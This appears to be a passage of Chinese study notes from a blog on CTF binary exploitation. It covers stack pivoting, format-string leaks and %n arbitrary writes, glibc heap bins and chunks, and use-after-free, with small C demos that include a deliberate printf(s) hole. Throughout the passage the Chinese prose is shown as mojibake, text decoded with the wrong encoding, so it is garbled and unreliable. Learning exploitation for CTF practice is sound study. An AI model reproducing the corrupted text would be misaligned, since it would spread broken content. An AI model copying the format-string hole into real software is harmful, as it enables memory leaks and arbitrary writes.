åœ°å€å¯èƒ½åœ¨è™šæ‹Ÿåœ°å€ä¸­æ˜ å°„ä¸¤ä»½<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230610163822498.png" alt="image-20230610163822498"></p><p>stripå»æ‰å‡½æ•°åâ€”â€”&gt;é˜²æŠ¤ç¨‹åº ï¼ˆIDAä¸­è‡ªåŠ¨ç”¨åç§»ä½œä¸ºå‡½æ•°åï¼‰<br>æ­¤æ—¶æ— â€œmainâ€å‡½æ•°ã€gdbä¸­æ–­ç‚¹ä¸‹ä¸äº†ã€‘</p><p><strong>ã€æ ˆè¿ç§»ã€‘</strong></p><p>èŠ±æ ·å¾ˆå¤šå•¦ æ ˆæ¬ºéª—<br>åˆ©ç”¨gadgetè¦†ç›–ebp æ¶æ„ä»£ç å†™åœ¨ebpä¸­ã€pop ret&#x2F;mov espï¼Œebpã€‘ebpè¾…ä½esp<br>espæŠ¹é™¤æ•°æ® ebpå¢åŠ  æ§åˆ¶espå³å¯<br><strong>pwn3_x64</strong></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230610182043459.png" alt="image-20230610182043459"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230610182053082.png" alt="image-20230610182053082"></p><p>writeç¬¬ä¸‰ä¸ªå‚æ•°æ— æ³•è·å–æ—¶ è¿æ°”ï¼ˆçŒœrdx&gt;8ï¼‰</p><p>retéœ€è¦ç»™æ˜¾ç¤ºå±å³æ ‡å‡†è¾“å‡º 1æ˜¯æ ‡å‡†è¾“å‡ºçš„ä»£å·</p><p><strong>æ ¼å¼åŒ–å­—ç¬¦ä¸²</strong>ï¼ˆä¿å­˜åœ¨æ ˆä¸Šï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> s[<span class="number">100</span>];</span><br><span class="line"><span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> b = <span class="number">0x22222222</span>;</span><br><span class="line"><span class="type">int</span> c = <span class="number">-1</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%08x.%08x.%08x.%s\n&quot;</span>,a.b,c,s);<span class="comment">//ç¬¬ä¸€ä¸ªå‚æ•°å³ä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼ˆ%08x.ï¼‰</span></span><br><span class="line"><span class="built_in">printf</span>(s);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸ç»™å‚æ•°æƒ…å†µä¸‹ ä¼šç›´æ¥å°†æ ˆä¸­å†…å®¹è¿›è¡Œæ‰“å°</p><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ”»é˜²ä¸­printfï¼ˆâ€%s%s%s(è¶³å¤Ÿé•¿å³å¯ä½¿å¾—ç¨‹åºå´©æºƒ)â€ï¼‰</p><p><strong>å­—ç¬¦ä¸²æˆªæ–­æ¼æ´ä¸»ä½“åˆ©ç”¨æ€æƒ³</strong>ï¼š</p><p> æˆªæ–­ç¬¦çš„ç¯¡æ”¹æˆ–æŠ¹å»ï¼ˆè®©å‡½æ•°è¯¯è§£ç¨‹åºæœªæ‰§è¡Œå®Œæ¯•ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230615225648504.png" alt="image-20230615225648504"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230615225717582.png" alt="image-20230615225717582"></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%pæº¢å‡º---&gt;å®é™…å°†æ ˆä¸Šé‡è¦æ•°æ®è¿›è¡Œæ‰“å°ï¼ˆå¦‚åœ°å€ï¼‰å¯ç”¨äºç»•è¿‡canary</span><br><span class="line">%sæº¢å‡º---&gt;è§£ææ ˆæ‰“å°å…¶ä¸­å†…å®¹ ---&gt;æ³„éœ²ä»»æ„åœ°å€</span><br><span class="line">æ³„éœ²ä»»æ„åœ°å€ï¼š</span><br><span class="line"><span class="number">1</span>.æ³„éœ²æ ˆä¸Šæœ¬èº«å­˜åœ¨çš„åœ°å€ï¼ˆå¦‚<span class="keyword">read</span>@gotï¼‰</span><br><span class="line"><span class="number">2</span>.æ³„éœ²åƒåœ¾æ•°æ®ï¼ˆç¯¡æ”¹å–½ï¼‰å†<span class="keyword">read</span>@got</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230615232327380.png" alt="image-20230615232327380"></p><p>ä¸ºé¿å…flagå’Œæ ¼å¼åŒ–å­—ç¬¦ä¸²ç¬¬ä¸€ä¸ªå‚æ•°è·ç¦»å¾ˆè¿œç›´æ¥ä¼ åœ°å€å³å¯ï¼ˆprintfï¼ˆâ€%100$dâ€,a,b,cï¼‰ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616002416632.png" alt="image-20230616002416632"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> b = <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> c = <span class="number">3</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%3$d&quot;</span>,a,b,c);<span class="comment">//æ‰“å°å‡º3  $n---&gt;æ‰“å°å‡ºç¬¬å‡ ä¸ªå‚æ•°</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>%d â€”-&gt;æ‰“å°æœ‰ç¬¦å·æ•´å‹  -140â€¦.å¯¹åº”0xfï¼ˆè¦ä¹ˆä¸ºåŠ¨æ€é“¾æ¥åº“ä¸­åœ°å€ è¦ä¹ˆä¸ºæ ˆä¸Šåœ°å€ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/yub/First@main/image-20230616134523270.png" alt="image-20230616134523270"></p><p>é€å‚æ‰“å°</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616134746197.png" alt="image-20230616134746197"></p><p>%nâ€”-&gt;è§£æåœ°å€å¯¹åº”å†…å®¹ â€”-å†™å…¥å‰æ–¹å·²ç»æ‰“å°æˆåŠŸçš„å­—ç¬¦ä¸ªæ•°ï¼ˆä»»æ„åœ°å€å†™ï¼‰<br>%n å†™å…¥4å­—èŠ‚0x00000004<br>%hnå†™å…¥ä¸¤å­—èŠ‚0x0004<br>%hhnå†™å…¥ä¸€å­—èŠ‚0x04<br>printfçš„ç¬¬n+1ä¸ªå‚æ•°æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬nä¸ªå‚æ•°<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616162630147.png" alt="image-20230616162630147"></p><p>0x0b &#x3D; 11ä¹Ÿå¯ä»¥è¯´æ˜ä¸ºç¬¬åä¸€ä¸ªå‚æ•°<br>ç©ºè¡Œéƒ¨åˆ†ç›¸å½“äºå¯¹å¡«å…¥æ•°æ®çš„æ‰“å°<br>å…³é”®ï¼šæ‰¾readå‡½æ•°åˆ¤æ–­å†™å…¥æ•°æ®ä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²ç¬¬å‡ ä¸ªå‚æ•°<br>x86å¯ä»¥ç›´æ¥æ•° x64å‰6ä¸ªå‚æ•°åœ¨å¯„å­˜å™¨ä¸­ç¬¬7ä¸ªæ‰åœ¨æ ˆä¸Š</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616170955472.png" alt="image-20230616170955472"></p><p>x64ç›´æ¥åˆ©ç”¨æ‰¾å‚æ•°ä½ç½® å¯æš´åŠ›æ‰“å°%7$p%8$p%9$p(ä»…ä¸ºä¸¾ä¾‹)<br>å‰6ä¸ªå‚æ•°åœ¨å¯„å­˜å™¨ä¸­ rspä¸ºç¬¬7ä¸ªâ€”&gt;å¯¹åº”n+1printfï¼ˆflagï¼‰å’Œnæ ¼å¼åŒ–å­—ç¬¦ä¸²å…³ç³»æ‰¾åˆ°ä½ç½®</p><p><strong>å †</strong><br>ä½œç”¨ï¼šç»™ç”¨æˆ·éšæ—¶æä¾›å¯ä½¿ç”¨çš„å†…å­˜ ç”¨å®Œåå½’è¿˜</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616174226840.png" alt="image-20230616174226840"></p><p>å †ç®¡ç†å™¨â€”&gt;ä¸­é—´äºº</p><p>å †ç®¡ç†å™¨å¹¶éç”±æ“ä½œç³»ç»Ÿå®ç°,è€Œæ˜¯ç”±libc.so.6é“¾æ¥åº“å®ç°ã€‚å°è£…äº†ä¸€äº›ç³»ç»Ÿè°ƒç”¨ï¹ä¸ºç”¨æˆ·æä¾›æ–¹ä¾¿çš„åŠ¨æ€å†…å­˜åˆ†é…æ¥å£çš„åŒæ—¶ï¹åŠ›æ±‚é«˜æ•ˆåœ°ç®¡ç†ç”±ç³»ç»Ÿè°ƒç”¨ç”³è¯·æ¥çš„å†…å­˜ã€‚</p><p>ç”³è¯·å†…å­˜ç³»ç»Ÿè°ƒç”¨ï¼š<br>brkï¼ˆdataæ®µæœ«å°¾å‘ä¸Šæ‰©å±•è°ƒç”¨ï¼‰ä¸»çº¿ç¨‹ç³»ç»Ÿè°ƒç”¨<br>mmapï¼ˆå†…å­˜&#x2F;ç£ç›˜æ˜ å°„ï¼‰</p><p>å†³å®šè¦ç´ ï¼šä¸»çº¿ç¨‹brkå’Œmmapéƒ½å¯ç”¨<br>                   å­çº¿ç¨‹åªå¯ç”¨mmap<br>å­çº¿ç¨‹ç”³è¯·ç©ºé—´è¿‡å¤§åœ¨mmapæ®µæ˜ å°„ å°å¯ç›´æ¥åœ¨dataæ®µå¼€è¾Ÿ<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616175743170.png" alt="image-20230616175743170"></p><p>mallocç”¨æˆ·å‘å †ç®¡ç†å™¨è¦å†…å­˜ brkå’Œmmapå‘æ“ä½œç³»ç»Ÿç”³è¯·</p><p><strong>arena</strong>ï¼ˆå°†ç‰©ç†å†…å­˜æ˜ å°„åˆ°è™šæ‹Ÿå†…å­˜ç©ºé—´å­˜å‚¨ç®¡ç†ï¼‰<br>å†…å­˜åˆ†é…åŒºï¼Œå¯ä»¥ç†è§£ä¸ºå †ç®¡ç†å™¨æ‰€æŒæœ‰çš„å†…å­˜æ± </p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">æ“ä½œç³»ç»Ÿ</span><span class="literal">--</span>&gt;<span class="comment">å †ç®¡ç†å™¨</span><span class="literal">--</span>&gt;<span class="comment">ç”¨æˆ·</span></span><br><span class="line"><span class="comment">ç‰©ç†å†…å­˜</span><span class="literal">--</span>&gt;<span class="comment">arena</span><span class="literal">--</span>&gt;<span class="comment">å¯ç”¨å†…å­˜</span></span><br></pre></td></tr></table></figure><p>å †ç®¡ç†å™¨ä¸ç”¨æˆ·çš„å†…å­˜äº¤æ˜“å‘ç”Ÿäºarenaä¸­ï¼ˆå †ç®¡ç†å™¨å‘æ“ä½œç³»ç»Ÿæ‰¹å‘æ¥çš„æœ‰å†—ä½™çš„å†…å­˜åº“ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618233511677.png" alt="image-20230618233511677"></p><p><strong>chunk</strong>ï¼ˆå†…å­˜åˆ†é…çš„æœ€å°å•ä½ ä¸å¯èƒ½å°äº8å­—èŠ‚ã€ä¸¤å­—é•¿16å­—èŠ‚ï¼ˆx64ï¼‰ã€‘x32å¤§å°ï¼‰<br>ç”¨æˆ·ç”³è¯·å†…å­˜çš„å•ä½ï¼Œä¹Ÿæ˜¯å †ç®¡ç†å™¨ç®¡ç†å†…å­˜çš„åŸºæœ¬å•ä½<br>mallocï¼ˆï¼‰è¿”å›çš„æŒ‡é’ˆæŒ‡å‘ä¸€ä¸ªchunkçš„æ•°æ®åŒºåŸŸ chunkå¤§å° å¤§äºmallocåˆ†é…å¤§å°<br>chunkåˆ†é…è§„å¾‹ï¼šåªèƒ½åˆ†é…å­—é•¿æ•´æ•°å€å¤§å°â€”&gt;sizeä½ä¸‰ä½ä¸€å®šä¸º0</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617134142917.png" alt="image-20230617134142917"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617140647896.png" alt="image-20230617140647896"></p><p>free chunk<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617234752208.png" alt="image-20230617234752208"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617143930107.png" alt="image-20230617143930107"></p><p>æ³¨æ„åœ¨sizeä½ä¸‰ä½æœ‰ä¸‰ä¸ªæ§åˆ¶å­—æ®µ<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230617145200469.png" alt="image-20230617145200469"></p><p>Aï¼šä¸»çº¿ç¨‹ Mï¼šæ˜¯å¦ä¸ºmmap Pï¼šç”¨äºfree chunkï¼ˆä¸º1â€“&gt;å‰ä¸€ä¸ªchunkè¢«å†™å…¥æ•°æ®å³å‰ä¸€ä¸ªchunkä¸ºmalloc chunk ä¸º0åˆ™å‰ä¸€ä¸ªchunkä¸ºfree chunkï¼‰1â€“&gt;å‰ä¸€ä¸ªchunkè¢«å ç”¨ 0â€“&gt;å‰ä¸€ä¸ªchunk pre-in-use</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617152524631.png" alt="image-20230617152524631"></p><p>fastbin free chunk å››å­—æ®µæ§åˆ¶ç»“æ„ smallbin free chunk å››å­—æ®µæ§åˆ¶ç»“æ„<br>bigbin free chunk å…­å­—æ®µæ§åˆ¶ç»“æ„</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617215936729.png" alt="image-20230617215936729"><br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618233738837.png" alt="image-20230618233738837"></p><p>fast binsç‹¬ç«‹äºå…¶ä»–å‡ ä¸ªbins å‹æ ˆå‡ºæ ˆå³å¯<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617235205771.png" alt="image-20230617235205771"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617235515996.png" alt="image-20230617235515996"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617220021172.png" alt="image-20230617220021172"></p><p>large bin free chunk 6ä¸ªå­—æ®µå…¨éƒ¨ç”¨åˆ°<br>malloc chunk ç”¨å‰ä¸¤ä¸ª<br>malloc chunkå‰é¢è¿˜æ˜¯malloc chunkæ—¶åªç”¨åˆ°ç¬¬äºŒä¸ªå­—æ®µ<br>small bin free chunk allocated chunkç”¨å‰4ä¸ªå­—æ®µ<br>fast bin free chunk ç”¨å‰3ä¸ªå­—æ®µ<br>ç»è¿‡ç¬¬ä¸€æ¬¡mallocåå †ç®¡ç†å™¨æ‰å®Œæˆåˆå§‹åŒ–<br>é¡µå¯¹é½ é¡µçš„å¤§å°æ˜¯4kb 4kbéœ€è¦2^12æ˜ å°„ç©ºé—´ 12bitsä¸º3byteså˜æˆ3ä¸ª0<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617222745908.png" alt="image-20230617222745908"></p><p>x64æœ€ä¸‹chunkå•ä½ï¼ˆ0x20å¤§å°ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617222844117.png" alt="image-20230617222844117"></p><p>x86 åŒç†å¾—æœ€å°å¤§å°ä¸º0x10ï¼ˆåˆ‡ä¸€åŠï¼‰<br>æ§åˆ¶å­—æ®µä¸å¯å¡«å†™ å †ç®¡ç†å™¨æ»¡è¶³ç”¨æˆ·éœ€æ±‚å‘æ“ä½œç³»ç»Ÿç”³è¯·0x100å¤§å°å®é™…ç”³è¯·chunkå¤§å°ä¸º0x110ï¼ˆpre size+size ä¸¤å­—é•¿ 16bits 0x10å¤§å°ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617223313606.png" alt="image-20230617223313606"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617225749420.png" alt="image-20230617225749420"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">void</span> *ptr = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">free</span>(ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>mallocå¾—åˆ°çš„å‡½æ•°æŒ‡é’ˆæŒ‡å‘size ï¼ˆå›¾ä¸­ï¼‰ä½†chunkå¼€å¤´çš„åœ°å€æ˜¯</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617230144174.png" alt="image-20230617230144174"></p><p>å…¶ä»–chunkä¸ºç¨‹åºè‡ªèº«åˆ©ç”¨ç¼“å†²åŒºæä¾›ï¼ˆå¦‚ï¼šprintfå‡½æ•° ã€æœªæŒ‡å®šstdoutç¼“å†²åŒºæ—¶ printfå‡½æ•°é»˜è®¤ç”¨mallocå¾—åˆ°ä¸€ä¸ªå †ä¸­çš„ç¼“å†²åŒºä¸ºstdoutæ‰€ç”¨ã€‘ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617231321789.png" alt="image-20230617231321789"></p><p>ç¨‹åºè¯»å–æ—¶ä»¥ä¸€æ¡è¯­å¥ä¸ºå•ä½ sizeå¤§å°ä¸ºç”³è¯·çš„0x100+prev size+sizeï¼ˆä¸¤å­—é•¿ï¼‰æ­¤æ—¶på·²è¢«ç¨‹åºå‘˜å¤ç”¨ å³æ­¤æ—¶æ€»sizeå¤§å°ï¼ˆæ€»chunkå¤§å° 0x100ä¸ºmalloc chunkå¤§å°ï¼‰ä¸º0x111</p><p><strong>previous sizeå¤ç”¨</strong><br>prev sizeé’ˆå¯¹free chunk å³å­˜å‚¨ä¸Šä¸€ä¸ªfree chunk<br>å½“ä¸Šä¸€ä¸ªchunkä¸ä¸ºfastbin free chunkæ—¶ï¼ˆä¸ºmalloc chunkï¼‰prev chunkå¯è¢«å¤ç”¨<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617233352292.png" alt="image-20230617233352292"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617233454554.png" alt="image-20230617233454554"></p><p>ä»¥ä¸Šå˜åŒ–chunkå˜åŒ–ç›¸åŒ 8å­—èŠ‚ç”³è¯·çš„å¤§å°ä¸ºå­—é•¿å¥‡æ•°å€åˆ†é…ç©ºé—´&#x3D;ç”³è¯·åˆ°çš„å­—é•¿æ•°-1mallocåˆ†é…ç©ºé—´å¤§å°<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618105030445.png" alt="image-20230618105030445"></p><p>0x100æ•°æ®åŒºåŸŸçš„å¤§å° 0x10ä¸ºæ§åˆ¶å­—æ®µçš„å¤§å° 1 prev in use ä½å¤§å°</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618105235986.png" alt="image-20230618105235986"></p><p>æ”¾åœ¨fast bin ä¸­çš„free chunkä»ä¼šè¢«æ ‡è®°ä¸ºåœ¨ä½¿ç”¨ä¸­ï¼ˆfast bin pä½æ’ä¸º1ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618105723997.png" alt="image-20230618105723997"></p><p><strong>ç‰©ç†é“¾è¡¨</strong>ã€ç›¸é‚»chunké—´sizeåŸŸè¿æ¥ï¼ˆæ•´æ•°ï¼‰ã€‘</p><p>é€šè¿‡prev sizeä¸²è”èµ·æ¥ï¼ˆè·å–å‰ä¸€ä¸ªchunkåœ°å€ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617234705813.png" alt="image-20230617234705813"></p><p><strong>é€»è¾‘é“¾è¡¨</strong>ï¼ˆå­˜åœ¨äºbinsä¸­ï¼‰ã€æŒ‡é’ˆè¿æ¥ã€‘<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618111056657.png" alt="image-20230618111056657"></p><p>æ¯ä¸€ä¸ªbinéƒ½å«æœ‰å¯¹åº”çš„é“¾è¡¨ æ„æˆçš„binsé“¾è¡¨ç§°ä¸ºé€»è¾‘é“¾è¡¨<br>åŒç±»chunkä¸²è”åˆ°å›æ”¶ç«™ä¸­ mallocç´¢å–ç›¸åº”å¤§å°æ—¶å¯é«˜æ•ˆä»å›æ”¶ç«™ä¸­æå–</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618111551403.png" alt="image-20230618111551403"></p><p><strong>bin</strong><br>ï¼ˆä¸´æ—¶ã€ç³»ç»Ÿéœ€è¦æ—¶å¯ç”¨ã€‘ï¼‰ä¿å­˜åˆšè¢«freeåå†…å­˜åŒºåŸŸçš„ç»“æ„ï¼ˆå †ç®¡ç†å™¨ä¸­ï¼‰<br>ç®¡ç†arenaä¸­ç©ºé—²chunkçš„ç»“æ„<br>ä»¥æ•°ç»„çš„å½¢å¼å­˜åœ¨ æ•°ç»„å…ƒç´ ä¸ºç›¸åº”å¤§å°çš„chunké“¾è¡¨çš„é“¾è¡¨å¤´<br>å­˜åœ¨äºarenaçš„malloc_stateä¸­<br>å¦‚ï¼š<br>unsorted bin<br>fast bins<br>small bins<br>large bins<br> (tcache)<br><strong>é™¤fast binå’Œtcacheä¸ºå•å‘é“¾è¡¨ å…¶ä½™binså‡ä¸ºåŒå‘é“¾è¡¨</strong><br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618230718261.png" alt="image-20230618230718261"><br>unsorted bin smallbin largebinåŒå‘é“¾è¡¨ç»“æ„binåˆ©ç”¨:<br>ğŸ¤–mallocåˆ†é…æ—¶<br>ğŸ°è·å–å¾ˆå¤§chunkæ—¶ä¼˜å…ˆä»å›æ”¶ç«™ä¸­æ‹¿å– unsorted binså˜ä¸ºsorted binsä½¿ç”¨<br>åŒå‘é“¾æ¥ï¼šå…ˆè¿›å…ˆå‡ºï¼ˆå›¾ä¸Šè‡ªä¸Šè€Œä¸‹mallocï¼‰<br>å¥½å¤„ï¼šé˜Ÿåˆ—åº•éƒ¨å‹å…¥æ•°æ® å¤´éƒ¨å–å‡ºæ•°æ® ä¸€æ¡é“¾è¡¨å°±å¯å¤„ç†æ•°æ®<br>small binï¼ˆå¤§å°å›ºå®šï¼‰<br>ä¸€ä¸ªbinå­˜å‚¨ä¸¤ä¸ªåœ°å€ ç‰©ç†å†…å­˜ä¸­è¿ç»­ æŠŠæ‰€æœ‰chunkä¸²è”</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618235211411.png" alt="image-20230618235211411"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618235427918.png" alt="image-20230618235427918"><br>large binsï¼ˆå¤§å°ä¸å®šã€æ¯ä¸€chunkå¤§å°ä¸ä¸€ã€‘ æœ€åä¸€ä¸ªchunkå­˜å‚¨æœ€åå€¼ï¼‰<br>å¤§å°ä¸ºèŒƒå›´ â€”&gt;ç”¨ä¸¤ä¸ªé¢å¤–çš„æ§åˆ¶åŸŸè®°å½•æ•°æ®<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618235448673.png" alt="image-20230618235448673"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618234942479.png" alt="image-20230618234942479"></p><p>fast binså¯å˜ä¸ºsmall binsï¼ˆfast binæ•´ä½“éå†æ£€æŸ¥æ—¶åˆ†ç±»ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618235237538.png" alt="image-20230618235237538"></p><p>BK POINTER åŸŸæ— å®é™…ä½œç”¨<br>top chunk<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619151359619.png" alt="image-20230619151359619"></p><p> malloc stateï¼ˆfastbinsY+binsï¼‰åœ¨libcæ•°æ®æ®µç®¡ç†ä¸»è¿›ç¨‹<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619120041795.png" alt="image-20230619120041795"></p><p><strong>ä»€ä¹ˆæ ·çš„chunkä¼šè¿›å…¥usorted bins</strong><br>åˆšåˆšé‡Šæ”¾ï¼ˆè¶…è¿‡fastbinå¤§å°ï¼‰ä¸èƒ½è¿›å…¥fastbinsä¸”æœªè¢«åˆ†ç±»çš„</p><p>è¶…å‡ºfastbinså¯ç”¨å¤§å°åˆ©ç”¨è¿‡ç¨‹ï¼šunsortedå…ˆä¹è®¨ åˆå¹¶é“¾æ¥å‡‘å¤§å° small largeä¸€èµ·æ¥ å®åœ¨ä¸å¤Ÿå–Štop<br>å…ˆæ‰¾sortedbins ä¸å¤Ÿè§¦å‘sortedéå† åˆå¹¶unsortedç›¸é‚»chunkå¹¶åˆ†ç±»<br>å³åˆ©ç”¨æ—¶åªè¦æ‰¾åˆ°æ¯”ç”¨æˆ·ç”³è¯·å¤§çš„chunkå³å¯ å‰©ä½™éƒ¨åˆ†ä¸ºlast  remainder chunkè½¬ä¸ºfastbinéƒ¨åˆ†æœ€åè¿›å…¥unsorted bins</p><p><strong>UAF</strong></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619160128310.png" alt="image-20230619160128310"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619160356676.png" alt="image-20230619160356676"></p><p>A freeåçš„å†…å­˜åŒº</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619160410293.png" alt="image-20230619160410293"></p><p>åœ¨ree chunkå’Œtop chunkå¼ æ”¾ä¸€ä¸ªmalloc chunké˜»æ­¢ä¸¤è€…åˆå¹¶ï¼ˆé¿å…å †ç®¡ç†å™¨çš„æ¶ˆè€—ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619161430277.png" alt="image-20230619161430277"></p><p>cåˆ†é…åˆ°aæ‰€åœ¨çš„å†…å­˜åŒºåŸŸä¸­ å ç”¨åˆ©ç”¨</p><p>gdbåç§»ä¸‹æ–­ç‚¹æ–¹æ³•</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">b</span> *<span class="variable">$rebase</span>(0x..)ã€åç§»ã€‘</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619193114872.png" alt="image-20230619193114872"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619193556660.png" alt="image-20230619193556660"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619203856606.png" alt="image-20230619203856606"></p><p>ç¬¬å››æ¬¡mallocåå¾—åˆ°æ ˆä¸Šåœ°å€ï¼ˆå †åˆ†é…ï¼‰</p><p>free aå<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619193754379.png" alt="image-20230619193754379"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619194533056.png" alt="image-20230619194533056"></p><p>é˜²æ­¢double freeæ¼æ´ï¼ˆUAFï¼‰ï¼šæ§åˆ¶å†…å­˜çš„æŒ‡é’ˆå’Œå†…å­˜å‡éœ€æ¸…ç©º ï¼ˆchunkè¢«æ¸…ç©ºä½†æŒ‡é’ˆæœªæ¸…ç©ºï¼‰<br>æ„å¤–ï¼šä½æƒé™æŒ‡é’ˆå¯å› ä½¿ç”¨åŒä¸€å—å†…å­˜åŒºåŸŸæ‹¥æœ‰é«˜æƒé™æŒ‡é’ˆåŠŸèƒ½ï¼ˆè‹¥ä½æƒé™æŒ‡é’ˆç¯¡æ”¹è¿”å›å€¼é«˜æƒé™æŒ‡é’ˆä¼šæ— æ„è¯†ä¼ 